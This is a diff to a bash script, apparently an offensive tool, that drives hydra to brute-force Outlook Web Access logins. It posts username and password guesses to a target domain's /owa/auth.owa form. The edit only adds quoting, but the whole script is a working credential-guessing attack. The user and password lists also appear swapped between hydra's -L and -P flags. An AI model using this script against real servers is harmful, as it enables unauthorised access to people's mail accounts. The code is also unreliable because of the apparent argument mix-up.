@@ -27,10 +27,10 @@ owabrute(){
             local PASSLIST="${3}"
 
             hydra -V            \
-                -L ${PASSLIST}  \
+                -L "${PASSLIST}"  \
                 -e s            \
-                -P ${USERSLIST} \
-                ${DOMAIN}       \
+                -P "${USERSLIST}" \
+                "${DOMAIN}"       \
                 https-post-form "/owa/auth.owa:flags=4&destination=https\://${DOMAIN}/owa/&forcedownlevel=0&username=^USER^&password=^PASS^&isUtf8=1:F=The user name or password"
         fi
     fi
@@ -55,14 +55,14 @@ else
     PASSLIST=""
     while getopts d:u:p:h: option; do
         case "${option}" in
-            d) DOMAIN=${OPTARG};;
-            u) USERSLIST=${OPTARG};;
-            p) PASSLIST=${OPTARG};;
+            d) DOMAIN="${OPTARG}";;
+            u) USERSLIST="${OPTARG}";;
+            p) PASSLIST="${OPTARG}";;
             h) usage;;
         esac
     done
 
-    if [[ ${DOMAIN} == "" ]] || [[ ${USERSLIST} == "" ]] || [[ ${PASSLIST} == "" ]]; then
+    if [[ "${DOMAIN}" == "" ]] || [[ "${USERSLIST}" == "" ]] || [[ "${PASSLIST}" == "" ]]; then
         usage
     else
         echo "${HEADER}"
@@ -83,7 +83,7 @@ else
         if [ ! -f "${USERSLIST}" ] || [ ! -f "${PASSLIST}" ]; then
             echo -e "\x1b[1m[\x1b[91mWARN\x1b[0m\x1b[1m]\x1b[0m Some resources could not be accessed. Aborting..."
         else
-            owabrute ${DOMAIN} ${USERSLIST} ${PASSLIST}
+            owabrute "${DOMAIN}" "${USERSLIST}" "${PASSLIST}"
         fi
     fi
 fi
